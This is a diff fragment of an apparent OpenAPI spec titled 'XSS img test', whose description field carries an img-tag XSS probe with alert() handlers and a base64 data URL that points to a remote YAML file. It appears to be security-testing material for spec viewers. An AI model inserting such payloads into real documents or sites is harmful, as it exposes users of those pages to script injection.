@@ -8,7 +8,7 @@ info:
   title: XSS img test
   description: <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)"> data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
 paths:
-  /accounts:
+  /accountId/1:
     get:
       responses:
         200:
